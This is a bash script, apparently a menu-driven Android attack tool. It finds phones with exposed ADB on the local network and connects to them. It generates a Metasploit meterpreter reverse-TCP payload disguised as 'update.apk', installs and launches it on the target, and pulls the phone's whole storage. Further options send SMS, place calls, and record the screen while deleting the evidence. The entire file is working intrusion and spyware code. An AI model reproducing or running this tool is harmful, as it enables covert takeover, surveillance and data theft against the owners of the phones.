#!/bin/bash





IP_gateway="$(ip route | grep via | awk '{print$3}')"

My_IP="$(ifconfig | grep 192 | awk '{print$2}')"

UE="$(adb devices | grep 1 | awk {'print$1'})"





download_drivers()

{	

	sudo apt-get install android-tools-adb

	sudo apt-get install scrcpy 

	adb tcpip 5555

	clear

	sudo ./DobreOczkoFIX.sh

}







show_targets()

{	

	echo -e "\e[35m Avaible Targets in your Connection: \e[0m"

	sudo nmap -sP $IP_gateway/24 | grep 'report' | awk '{print$5$6}'

	sudo ./DobreOczkoFIX.sh

}



connect_to_target()

{

	sudo nmap -sP $IP_gateway/24 | grep 'report' | awk '{print$5$6}'	

	echo " Tell Me Target's IP "

	read target

	sudo adb connect $target:5555

	sudo ./DobreOczkoFIX.sh

}



connected_devices()

{

	sudo adb devices

	sudo ./DobreOczkoFIX.sh

}



reboot()

{

	sudo adb reboot 

	clear

	sudo ./DobreOczkoFIX.sh

}



infection_gen()

{	

	echo " Tell Me your IPv4 "

	read R_IP

	echo " Tell Me communication PORT "

	read R_PORT

	msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=$R_IP LPORT=$R_PORT R > update.apk

	clear

	echo " Infection Generated. "

	sudo ./DobreOczkoFIX.sh

}



infect_target()



{

	adb -s $UE install update.apk

	clear

	echo " Phone Infected. "

	sleep 2

	echo " Deleting infection from Kali System..."

	sudo rm update.apk

	sudo ./DobreOczkoFIX.sh

	

}



remote_control_target()

{



	adb shell am start -n com.metasploit.stage/com.metasploit.stage.MainActivity

	sudo ./DobreOczkoFIX.sh

}



download_photos()

{

	adb pull /sdcard /home/kali/Desktop

	sudo chmod 777 sdcard

	sudo ./DobreOczkoFIX.sh

}



sms()

{	

	clear

	echo " Input Phone Number, ex. +48000000000"

	read phone

	echo " Message "

	read message

	adb shell service call isms 7 i32 0 s16 "com.android.mms.service" s16 "$phone" s16 "null" s16 "'$message'" s16 "null" s16 "null"

	sudo ./DobreOczkoFIX.sh

}



record_screen()

{

	echo " Please Input File Name, ex. example.mp4 "

	read file_name_recording

	echo " Please Input Time. Max 180 sec "

	read time 

	adb shell screenrecord /sdcard/$file_name_recording.mp4 --time-limit $time

	echo "Downloading File..."

	adb pull /sdcard/$file_name_recording.mp4

	echo "Deleting video from Device..."

	adb shell rm /sdcard/$file_name_recording.mp4

	sudo chmod 777 $file_name_recording.mp4

	sudo ./DobreOczkoFIX.sh

}



open_site()

{

	echo " Please Input Website, ex. https://www.google.com "

	read website

	adb shell input keyevent 82

	sleep 2

	adb shell am start -a android.intent.action.VIEW -d $website

	sudo ./DobreOczkoFIX.sh

}



disconnect_devices()

{

	adb disconnect

	sudo ./DobreOczkoFIX.sh

}



music_file()

{	

	echo " Tell Me a File Directory, ex. /home/kali/Desktop/jozepstalim.wav"

	read directory

	echo "Tell Me a File Name, ex. jozepstalim.wav"

	read file_name

	adb push $directory /sdcard

	adb shell am start -a android.intent.action.VIEW -d file:///sdcard/$file_name -t video/wav

	adb shell rm sdcard/$file_name

	sudo ./DobreOczkoFIX.sh



}

remote()



{

	scrcpy --tcpip=$UE

	sudo ./DobreOczkoFIX.sh

}



call()

{

	echo " Tell me phone number you want to call, ex. +48000000000"

	read phone_call

	adb shell am start -a android.intent.action.CALL -d tel:$phone_call

	sudo ./DobreOczkoFIX.sh

}



figlet REMOTE







echo " "

echo "CONNECTED TO: " 

adb devices | awk '{print$1}'





echo "By Nasi UwU"

echo ""

echo -e " [00]  \e[31m Disconnect Devices \e[0m"

echo -e " [01]  \e[31m Download Drivers \e[0m"	

echo -e " [02]  \e[31m Show Reverse TCP Targets \e[0m"

echo -e " [03]  \e[31m Display Connected Targets \e[0m"

echo -e " [04]  \e[31m Connect to Target \e[0m"

echo -e " [05]  \e[31m Reboot Target \e[0m"

echo -e " [06]  \e[31m Infection Download \e[0m"

echo -e " [07]  \e[31m Infect Target \e[0m"

echo -e " [08]  \e[31m Remote Control Target \e[0m"

echo -e " [09]  \e[31m Download every file from Target \e[0m"

echo -e " [10]  \e[31m SMS \e[0m"

echo -e " [11]  \e[31m Recording Screen \e[0m"

echo -e " [12]  \e[31m Open WWW Site \e[0m "

echo -e " [13]  \e[31m Open Music File \e[0m "

echo -e " [14]  \e[31m Remote Phone Control \e[0m "

echo -e " [15]  \e[31m Call Someone From Targets Device \e[0m "









read option

case "$option" in



  "00") disconnect_devices ;; 

  "01") download_drivers ;;

  "02") show_targets ;;

  "03") connected_devices ;;

  "04") connect_to_target ;;

  "05") reboot ;;

  "06") infection_gen ;;

  "07") infect_target ;;

  "08") remote_control_target ;;

  "09") download_photos ;;

  "10") sms ;;

  "11") record_screen ;;

  "12") open_site ;;  

  "13") music_file ;;

  "14") remote ;;

  "15") call ;;



  







  *) clear && ./DobreOczkoFIX.sh

  

esac

